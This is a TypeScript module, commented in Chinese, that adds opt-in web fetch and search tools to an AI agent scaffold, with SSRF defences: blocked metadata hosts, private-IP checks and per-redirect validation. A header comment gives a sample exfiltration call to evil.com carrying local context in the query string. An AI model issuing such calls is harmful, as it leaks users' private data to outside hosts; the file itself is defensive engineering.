/**
 * pi-starter · 联网工具：web_fetch / web_search
 *
 * **为什么需要它。** `src/prompts/rules.md` 第 1 条要求「凡是需要事实的地方必须调用工具核实」。
 * 本地文件、知识库、SQLite 能核实「这里的事实」，但**外部世界**的事实（某个库的最新版本、
 * 某个 API 现在的用法、一条新闻的出处）在默认装配里无工具可核 —— 于是通用场景下的正确回答
 * 只能是「我无法核实」。这两个工具补上那一半。
 *
 * **默认关闭**（`PI_WEB=on` 才注册）。理由与 bash / edit / write 默认关闭一致，而且更直接：
 * 出站网络是**数据外泄通道** —— `web_fetch("https://evil.com/?d=<本地内容>")` 一句话就能把
 * 上下文里的东西发出去，而本服务默认无鉴权。`web_fetch` 只做读，但它读什么、带什么查询串，
 * 是模型决定的。要用再开，别默认给。
 *
 * **后端可注入。** 想换搜索源（Brave / SearXNG / 自有网关）、加缓存、加审计，实现一个
 * {@link WebClient} 传给 `buildAgent({ webClient })` 即可，工具契约与模型侧完全不变。
 * 这是这个脚手架一贯的做法：能力走接口，不塞死在实现里。
 *
 * **这不是浏览器。** 只取 HTTP 正文、只按 UTF-8 解码、HTML 用正则剥标签。JS 渲染的页面、
 * 需要登录的页面、PDF/二进制都不在范围内（会明确告知，而不是返回一堆乱码）。
 */

import { lookup } from "node:dns/promises";
import { isIP } from "node:net";
import { Type } from "typebox";
import { defineTool, type ToolDefinition } from "@earendil-works/pi-coding-agent";
import { defineToolSpec, type ToolSpec } from "./registry.js";

/* ────────────────────────── 契约 ────────────────────────── */

/** 一次抓取的结果。`text` 已转成纯文本；`truncated` 表示被字节上限截断。 */
export interface FetchedPage {
  /** 最终 URL（跟随重定向之后）。 */
  url: string;
  status: number;
  contentType: string;
  text: string;
  truncated: boolean;
}

/** 一条搜索命中。 */
export interface SearchHit {
  title: string;
  url: string;
  snippet: string;
}

export interface WebFetchOptions {
  maxBytes?: number;
  timeoutMs?: number;
}

/**
 * 联网后端。`search` 是可选的：**没有搜索后端时不注册 `web_search`**——
 * 宁可少一个工具，也不要给模型一个「假装能搜」的名字（与 `rag:smoke` 打印 SKIP 同一原则）。
 */
export interface WebClient {
  /** 实现标识，进工具返回的 details，便于排查「到底走的哪个后端」。 */
  readonly kind: string;
  fetchPage(url: string, options?: WebFetchOptions): Promise<FetchedPage>;
  search?(query: string, limit: number): Promise<SearchHit[]>;
}

/** 联网相关的失败。带 `code` 便于调用方与测试区分原因。 */
export class WebError extends Error {
  constructor(
    message: string,
    readonly code:
      | "bad_url"
      | "blocked_host"
      | "too_large"
      | "http_error"
      | "timeout"
      | "not_text"
      | "network",
  ) {
    super(message);
    this.name = "WebError";
  }
}

/* ────────────────────────── 限额 ────────────────────────── */

export const DEFAULT_FETCH_MAX_BYTES = 256 * 1024;
export const MAX_FETCH_MAX_BYTES = 2 * 1024 * 1024;
export const DEFAULT_FETCH_TIMEOUT_MS = 15_000;
export const MAX_FETCH_TIMEOUT_MS = 60_000;
/** 重定向最多跟几跳。每一跳都要过 host 策略，所以这个上限同时也是 SSRF 面的上限。 */
export const MAX_REDIRECTS = 5;
/** 默认 UA：标明是自己，不伪装浏览器。 */
const DEFAULT_USER_AGENT = "pi-starter (+https://github.com/LPK3215/pi-starter)";
export const DEFAULT_SEARCH_LIMIT = 5;
export const MAX_SEARCH_LIMIT = 20;
/** 单次搜索能接受的响应体上限（避免搜索后端回一个巨型页面）。 */
const SEARCH_MAX_BYTES = 512 * 1024;

/* ────────────────────────── SSRF 防护 ────────────────────────── */

/** 明确不是「外网」的主机名。 */
const BLOCKED_HOSTNAMES = new Set([
  "localhost",
  "localhost.localdomain",
  "metadata.google.internal", // GCP 元数据服务
  "metadata.goog",
]);

/** IPv4 私有 / 保留段。 */
function isPrivateIPv4(ip: string): boolean {
  const parts = ip.split(".").map((piece) => Number.parseInt(piece, 10));
  if (parts.length !== 4 || parts.some((n) => !Number.isInteger(n) || n < 0 || n > 255)) return true;
  const [a, b] = parts as [number, number, number, number];
  if (a === 0 || a === 10 || a === 127) return true; // 本网络 / 私有 / 回环
  if (a === 169 && b === 254) return true; // 链路本地（含云元数据 169.254.169.254）
  if (a === 172 && b >= 16 && b <= 31) return true; // 私有
  if (a === 192 && b === 168) return true; // 私有
  if (a === 192 && b === 0) return true; // IETF 协议分配 / TEST-NET
  if (a === 198 && (b === 18 || b === 19)) return true; // 基准测试网段
  if (a === 100 && b >= 64 && b <= 127) return true; // CGNAT
  if (a >= 224) return true; // 组播 / 保留（含 255.255.255.255）
  return false;
}

/** IPv6 私有 / 保留段（含 IPv4 映射地址）。 */
function isPrivateIPv6(ip: string): boolean {
  const lower = ip.toLowerCase();
  if (lower === "::" || lower === "::1") return true;
  // IPv4 映射的点分写法：::ffff:127.0.0.1
  const dotted = /^::(?:ffff:)?(\d{1,3}(?:\.\d{1,3}){3})$/.exec(lower);
  if (dotted?.[1]) return isPrivateIPv4(dotted[1]);
  // IPv4 映射的十六进制写法：`new URL()` 会把 ::ffff:127.0.0.1 归一化成 ::ffff:7f00:1，
  // 所以这一支不是死角——只认点分写法会漏掉本机地址。
  const hex = /^(?:::ffff:|::)([0-9a-f]{1,4}):([0-9a-f]{1,4})$/.exec(lower);
  if (hex?.[1] && hex[2]) {
    const hi = Number.parseInt(hex[1], 16);
    const lo = Number.parseInt(hex[2], 16);
    return isPrivateIPv4(`${hi >> 8}.${hi & 0xff}.${lo >> 8}.${lo & 0xff}`);
  }
  const head = lower.split(":")[0] ?? "";
  if (head.startsWith("fc") || head.startsWith("fd")) return true; // 唯一本地地址 fc00::/7
  if (/^fe[89ab]/.test(head)) return true; // 链路本地 fe80::/10
  if (head.startsWith("ff")) return true; // 组播
  return false;
}

/** 一个 IP 字面量是否属于「不该由模型去访问」的网段。 */
export function isPrivateAddress(ip: string): boolean {
  const version = isIP(ip);
  if (version === 4) return isPrivateIPv4(ip);
  if (version === 6) return isPrivateIPv6(ip);
  return true; // 认不出来的一律按私有处理（fail-closed）
}

/**
 * 校验目标 URL：只允许 http/https，且解析出的**每一个**地址都必须是公网。
 *
 * 为什么要查 DNS：只挡 IP 字面量挡不住 `evil.com` 解析到 `127.0.0.1`。
 * 局限：解析与真正建连之间有 TOCTOU 窗口（DNS rebinding），要彻底封住得把解析结果
 * 固定下来再连。对「本地优先、默认关闭」的脚手架来说这个强度够用，此处显式记录。
 */
export function parseHttpUrl(raw: string): URL {
  let url: URL;
  try {
    url = new URL(raw);
  } catch {
    throw new WebError(`不是合法的 URL：${raw}`, "bad_url");
  }
  if (url.protocol !== "http:" && url.protocol !== "https:") {
    throw new WebError(`只支持 http/https，收到：${url.protocol}`, "bad_url");
  }
  if (!url.hostname) throw new WebError("URL 缺少主机名", "bad_url");
  return url;
}

/**
 * host 策略。默认 {@link assertPublicUrl}（只允许公网）。
 *
 * 可注入是有意的：内网部署 / 走自有出口代理时需要放行，测试也需要能连本地服务。
 * **换掉它等于关掉 SSRF 防护**，所以只在明确知道网络边界的场景替换。
 */
export type UrlGuard = (url: URL) => Promise<void>;

/** 只查 host——协议已由 {@link parseHttpUrl} 保证，所以这个检查无法被注入绕过。 */
export async function assertPublicHost(url: URL): Promise<void> {
  const host = url.hostname.replace(/^\[|\]$/g, "").toLowerCase();
  if (BLOCKED_HOSTNAMES.has(host) || host.endsWith(".localhost")) {
    throw new WebError(`拒绝访问本机地址：${host}`, "blocked_host");
  }
  if (isIP(host)) {
    if (isPrivateAddress(host)) throw new WebError(`拒绝访问内网地址：${host}`, "blocked_host");
    return;
  }
  let records: Array<{ address: string }>;
  try {
    records = await lookup(host, { all: true, verbatim: true });
  } catch {
    throw new WebError(`域名解析失败：${host}`, "network");
  }
  if (records.length === 0) throw new WebError(`域名没有解析结果：${host}`, "network");
  const bad = records.find((record) => isPrivateAddress(record.address));
  if (bad) throw new WebError(`域名 ${host} 解析到内网地址 ${bad.address}，已拒绝`, "blocked_host");
}

export async function assertPublicUrl(raw: string): Promise<URL> {
  const url = parseHttpUrl(raw);
  await assertPublicHost(url);
  return url;
}

/* ────────────────────────── HTML → 纯文本 ────────────────────────── */

/**
 * 极简 HTML → 文本。
 *
 * 不做 DOM 解析（零依赖）。对「读文档 / 读公告」够用；对重度 JS 页面没用——那种情况
 * 工具会返回「几乎没有正文」，而不是编造内容。
 */
export function htmlToText(html: string): string {
  return html
    .replace(/<script[\s\S]*?<\/script>/gi, " ")
    .replace(/<style[\s\S]*?<\/style>/gi, " ")
    .replace(/<noscript[\s\S]*?<\/noscript>/gi, " ")
    .replace(/<!--[\s\S]*?-->/g, " ")
    .replace(/<(?:br|\/p|\/div|\/li|\/tr|\/h[1-6]|\/section|\/article)\s*\/?>/gi, "\n")
    .replace(/<[^>]*>/g, " ")
    .replace(/&nbsp;/gi, " ")
    .replace(/&lt;/gi, "<")
    .replace(/&gt;/gi, ">")
    .replace(/&quot;/gi, '"')
    .replace(/&#0?39;/g, "'")
    .replace(/&apos;/gi, "'")
    .replace(/&amp;/gi, "&")
    .replace(/[ \t\f\v]+/g, " ")
    .replace(/ *\n */g, "\n")
    .replace(/\n{3,}/g, "\n\n")
    .trim();
}

/** 按上限读取响应体，超出即停止并标记截断（不把整页拉进内存）。 */
async function readCapped(response: Response, maxBytes: number): Promise<{ bytes: Uint8Array; truncated: boolean }> {
  const body = response.body;
  if (!body) return { bytes: new Uint8Array(0), truncated: false };
  const reader = body.getReader();
  const chunks: Uint8Array[] = [];
  let total = 0;
  let truncated = false;
  try {
    for (;;) {
      const { done, value } = await reader.read();
      if (done) break;
      if (!value || value.length === 0) continue;
      // 必须是 `>` 而不是 `>=`：正文**恰好等于**上限时一个字都没丢，报 truncated 就是撒谎，
      // 模型会以为还有后半截没看到。
      if (total + value.length > maxBytes) {
        chunks.push(value.subarray(0, Math.max(maxBytes - total, 0)));
        total = maxBytes;
        truncated = true;
        break;
      }
      chunks.push(value);
      total += value.length;
    }
  } finally {
    await reader.cancel().catch(() => undefined);
  }
  const bytes = new Uint8Array(total);
  let offset = 0;
  for (const chunk of chunks) {
    bytes.set(chunk, offset);
    offset += chunk.length;
  }
  return { bytes, truncated };
}

function looksTextual(contentType: string): boolean {
  const type = contentType.toLowerCase();
  return (
    type.includes("text/") ||
    type.includes("json") ||
    type.includes("xml") ||
    type.includes("javascript") ||
    type.includes("x-www-form-urlencoded") ||
    type === ""
  );
}

/**
 * 把模型传入的数值夹进 `[min, max]`；非数值回落 `fallback`。
 *
 * 与 `search_knowledge` 的 limit 同一原则：参数来自外部（模型），不设上界时一句
 * `maxBytes: 1e9` 就能把一整页塞进上下文。导出以便业务策略复用与单测。
 */
export function clampWebNumber(raw: unknown, fallback: number, min: number, max: number): number {
  const value = Number(raw ?? fallback);
  if (!Number.isFinite(value)) return fallback;
  return Math.min(Math.max(Math.trunc(value), min), max);
}

/* ────────────────────────── 默认实现 ────────────────────────── */

export interface HttpWebClientOptions {
  /** 默认字节上限；可被单次调用覆盖（仍会被 MAX_FETCH_MAX_BYTES 夹住）。 */
  maxBytes?: number;
  /** 默认超时；可被单次调用覆盖。 */
  timeoutMs?: number;
  /** 自定义 User-Agent；默认标明是自己（不伪装浏览器）。 */
  userAgent?: string;
  /** 搜索端点（给一个查询词，返回可抓取的 URL）；不传则用 DuckDuckGo 无 JS 版。 */
  searchEndpoint?: (query: string) => string;
  /** host 策略；默认只允许公网（{@link assertPublicHost}）。换掉它等于关掉 SSRF 防护。 */
  urlGuard?: UrlGuard;
}

/** 这个响应是不是一个还要继续跟的重定向。 */
function redirectLocation(response: Response): string | undefined {
  if (![301, 302, 303, 307, 308].includes(response.status)) return undefined;
  const location = response.headers.get("location");
  return location && location.trim() !== "" ? location.trim() : undefined;
}

/** 默认联网后端：`fetch` + SSRF 防护 + 字节上限。零依赖（Node 18+ 自带 fetch）。 */
export class HttpWebClient implements WebClient {
  readonly kind = "http";

  constructor(private readonly options: HttpWebClientOptions = {}) {}

  /** host 策略；默认只允许公网。 */
  private get guard(): UrlGuard {
    return this.options.urlGuard ?? assertPublicHost;
  }

  async fetchPage(raw: string, options: WebFetchOptions = {}): Promise<FetchedPage> {
    // 协议校验在这里、且**不经过 urlGuard** —— 注入 host 策略也换不掉「只允许 http/https」。
    let current = parseHttpUrl(raw);
    const maxBytes = clampWebNumber(
      options.maxBytes ?? this.options.maxBytes,
      DEFAULT_FETCH_MAX_BYTES,
      1,
      MAX_FETCH_MAX_BYTES,
    );
    const timeoutMs = clampWebNumber(
      options.timeoutMs ?? this.options.timeoutMs,
      DEFAULT_FETCH_TIMEOUT_MS,
      1,
      MAX_FETCH_TIMEOUT_MS,
    );
    // 整条重定向链共用一个超时，而不是每跳各给一次（否则 5 跳就能拖到 5 倍时长）。
    const signal = AbortSignal.timeout(timeoutMs);
    let response: Response | undefined;
    for (let hop = 0; response === undefined; hop += 1) {
      if (hop > MAX_REDIRECTS) {
        throw new WebError(`重定向次数超过 ${MAX_REDIRECTS} 次：${raw}`, "network");
      }
      // **每一跳都先校验再请求。** 原实现用 `redirect: "follow"`，等于请求已经打到下一跳
      // 之后才检查地址 —— 302 到内网时请求**已经发出去了**，事后再拦只能阻止读回内容，
      // 挡不住「内网端点被触发」（对带副作用的 GET 就是真实影响）。所以改为 manual 自己跟。
      await this.guard(current);
      try {
        response = await fetch(current, {
          redirect: "manual",
          signal,
          headers: {
            "user-agent": this.options.userAgent ?? DEFAULT_USER_AGENT,
            accept: "text/html,application/xhtml+xml,text/plain,application/json;q=0.9,*/*;q=0.8",
          },
        });
      } catch (err) {
        const reason = err instanceof Error && err.name === "TimeoutError" ? "timeout" : "network";
        throw new WebError(
          reason === "timeout" ? `抓取超时（${timeoutMs}ms）：${current.href}` : `抓取失败：${current.href}`,
          reason,
        );
      }
      const location = redirectLocation(response);
      if (!location) break;
      response.body?.cancel(undefined).catch(() => undefined);
      try {
        current = new URL(location, current);
      } catch {
        throw new WebError(`重定向目标不是合法 URL：${location}`, "bad_url");
      }
      response = undefined;
    }
    const finalUrl = response.url || current.href;
    const discard = () => {
      response?.body?.cancel(undefined).catch(() => undefined);
    };
    const contentType = response.headers.get("content-type") ?? "";
    if (!response.ok) {
      discard();
      throw new WebError(`HTTP ${response.status} ${response.statusText}：${finalUrl}`, "http_error");
    }
    if (!looksTextual(contentType)) {
      discard();
      throw new WebError(
        `不是文本内容（content-type: ${contentType || "未知"}），这个工具只读网页文本`,
        "not_text",
      );
    }
    const { bytes, truncated } = await readCapped(response, maxBytes);
    const body = new TextDecoder("utf-8", { fatal: false }).decode(bytes);
    const text = contentType.toLowerCase().includes("html") || /<html|<!doctype/i.test(body.slice(0, 512))
      ? htmlToText(body)
      : body.trim();
    return { url: finalUrl, status: response.status, contentType, text, truncated };
  }

  /** 默认搜索：DuckDuckGo 的无 JS 端点。best-effort HTML 解析，生产请注入自己的后端。 */
  async search(query: string, limit: number): Promise<SearchHit[]> {
    const endpoint = this.options.searchEndpoint ?? ((q: string) => `https://html.duckduckgo.com/html/?q=${encodeURIComponent(q)}`);
    const page = await this.fetchPage(endpoint(query), { maxBytes: SEARCH_MAX_BYTES });
    return parseDuckDuckGoResults(page.text, limit);
  }
}

/**
 * 从 DuckDuckGo 无 JS 版结果页里抽命中。
 *
 * 明确是 best-effort：页面已被 `htmlToText` 拍平，这里按「出现链接即一条结果」的启发式切块，
 * 对方改版就会抽不到 —— 那时返回空数组，工具会如实说「没有命中」，而不是编造结果。
 * 生产环境请实现自己的 {@link WebClient.search}。
 */
export function parseDuckDuckGoResults(text: string, limit: number): SearchHit[] {
  const hits: SearchHit[] = [];
  const blocks = text.split(/\n(?=https?:\/\/)/);
  for (const block of blocks) {
    const urlMatch = /^(https?:\/\/\S+)/.exec(block.trim());
    if (!urlMatch?.[1]) continue;
    const url = urlMatch[1];
    if (/duckduckgo\.com/.test(url)) continue;
    const rest = block.slice(url.length).replace(/\s+/g, " ").trim();
    if (!rest) continue;
    hits.push({ title: rest.slice(0, 200), url, snippet: rest.slice(0, 400) });
    if (hits.length >= limit) break;
  }
  return hits;
}

/* ────────────────────────── 工具 ────────────────────────── */

const FETCH_DESCRIPTION =
  "抓取一个 http/https URL 的正文并转成纯文本。当你需要外部世界的最新事实（文档、发布说明、公告）时用它核实，不要凭记忆回答。内网与回环地址会被拒绝。";
const SEARCH_DESCRIPTION =
  "搜索网络，返回标题/链接/摘要。需要外部事实但不知道确切网址时先用它，再用 web_fetch 读具体页面。";

const WEB_TOOL_NAMES = ["web_fetch", "web_search"] as const;

/**
 * 登记进 ToolRegistry 的元数据。与 exec 同一口径：联网工具**不在 `allTools` 里**，
 * 默认关；开了才登记，否则 off 档的能力目录里也会出现它们。
 * 能力标签 `net` → `inferRisk` 给 `medium`，审批与 UI 分组都能据此识别。
 */
export function webRegistrySpecs(toolNames: readonly string[] = WEB_TOOL_NAME_LIST): ToolSpec[] {
  const specs: ToolSpec[] = [];
  if (toolNames.includes("web_fetch")) {
    specs.push(
      defineToolSpec({ name: "web_fetch", description: FETCH_DESCRIPTION, source: "custom", capabilities: ["net"] }),
    );
  }
  if (toolNames.includes("web_search")) {
    specs.push(
      defineToolSpec({ name: "web_search", description: SEARCH_DESCRIPTION, source: "custom", capabilities: ["net"] }),
    );
  }
  return specs;
}

/** 抓取网页正文。 */
export function createWebFetchTool(client: WebClient) {
  return defineTool({
    name: "web_fetch",
    label: "抓取网页",
    description: FETCH_DESCRIPTION,
    parameters: Type.Object({
      url: Type.String({ description: "完整的 http(s) URL" }),
      maxBytes: Type.Optional(
        Type.Number({ description: `正文字节上限，默认 ${DEFAULT_FETCH_MAX_BYTES}` }),
      ),
    }),
    async execute(_id, params: { url: string; maxBytes?: number }) {
      try {
        const page = await client.fetchPage(params.url, {
          ...(params.maxBytes !== undefined ? { maxBytes: params.maxBytes } : {}),
        });
        const header = `URL: ${page.url}\nHTTP: ${page.status}${
          page.truncated ? "（正文已按上限截断）" : ""
        }\n\n`;
        return {
          content: [{ type: "text", text: `${header}${page.text || "（没有可读正文）"}` }],
          details: { ok: true, client: client.kind, url: page.url, status: page.status, truncated: page.truncated },
        };
      } catch (err) {
        const message = err instanceof WebError ? err.message : err instanceof Error ? err.message : String(err);
        return {
          content: [{ type: "text", text: `抓取失败：${message}` }],
          // 失败分支保持与成功分支**同一个 details 形状**：否则联合类型会让 SDK 的
          // AgentToolResult<T> 推导失败（`status` 在一支里有、另一支里没有）。
          details: { ok: false, client: client.kind, url: params.url, status: 0, truncated: false },
        };
      }
    },
  });
}

/** 搜索。仅在 `client.search` 存在时注册。 */
export function createWebSearchTool(client: WebClient & { search: NonNullable<WebClient["search"]> }) {
  return defineTool({
    name: "web_search",
    label: "搜索网络",
    description: SEARCH_DESCRIPTION,
    parameters: Type.Object({
      query: Type.String({ description: "搜索词" }),
      limit: Type.Optional(Type.Number({ description: `最多返回几条，默认 ${DEFAULT_SEARCH_LIMIT}` })),
    }),
    async execute(_id, params: { query: string; limit?: number }) {
      const limit = clampWebNumber(params.limit, DEFAULT_SEARCH_LIMIT, 1, MAX_SEARCH_LIMIT);
      try {
        const hits = await client.search(params.query, limit);
        if (hits.length === 0) {
          return {
            content: [{ type: "text", text: `没有搜到「${params.query}」的结果。` }],
            details: { ok: true, client: client.kind, hits: 0 },
          };
        }
        const text = hits.map((hit, i) => `${i + 1}. ${hit.title}\n   ${hit.url}\n   ${hit.snippet}`).join("\n");
        return { content: [{ type: "text", text }], details: { ok: true, client: client.kind, hits: hits.length } };
      } catch (err) {
        const message = err instanceof WebError ? err.message : err instanceof Error ? err.message : String(err);
        return {
          content: [{ type: "text", text: `搜索失败：${message}` }],
          details: { ok: false, client: client.kind, hits: 0 },
        };
      }
    },
  });
}

/**
 * 按档位装配联网工具。
 *
 * `enabled=false` 返回空数组（默认）；开后若后端**没有** `search` 实现，只给 `web_fetch`——
 * 不给一个注定失败的 `web_search`。
 */
export function webToolsForMode(enabled: boolean, client?: WebClient): ToolDefinition[] {
  if (!enabled) return [];
  const resolved: WebClient = client ?? new HttpWebClient();
  const tools: ToolDefinition[] = [createWebFetchTool(resolved)];
  if (resolved.search) {
    tools.push(createWebSearchTool(resolved as WebClient & { search: NonNullable<WebClient["search"]> }));
  }
  return tools;
}

/** 联网工具名清单（供注册表 / 测试断言「这些名字确实存在」）。 */
export const WEB_TOOL_NAME_LIST: readonly string[] = WEB_TOOL_NAMES;
